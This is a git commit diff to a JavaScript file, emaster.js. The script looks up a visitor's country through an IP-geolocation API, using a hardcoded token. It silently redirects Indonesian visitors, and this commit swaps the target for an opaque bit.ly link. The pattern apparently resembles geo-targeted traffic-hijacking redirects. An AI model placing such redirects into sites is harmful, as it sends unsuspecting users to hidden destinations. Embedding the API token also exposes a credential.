9635779c3bcd12ab5262c29a6ab6cf31bfa403c2
abiazizi <88833124+abiazizi@users.noreply.github.com>
2026-05-22 21:36:12 +0700

    Update emaster.js

--- emaster.js
+++ emaster.js
@@ -2,7 +2,7 @@ fetch('https://api.ipinfo.io/lite/me?token=aae1300c15f1b2')
     .then(response => response.json())
     .then(data => {
         if( data.country_code == "ID" ){
-            window.location.href = 'https://vt.tokopedia.com/t/ZS9YmbSBRahuF-49oy8/';
+            window.location.href = 'https://bit.ly/4a5hpRE';
             console.log(data.country_code);
         }
     })
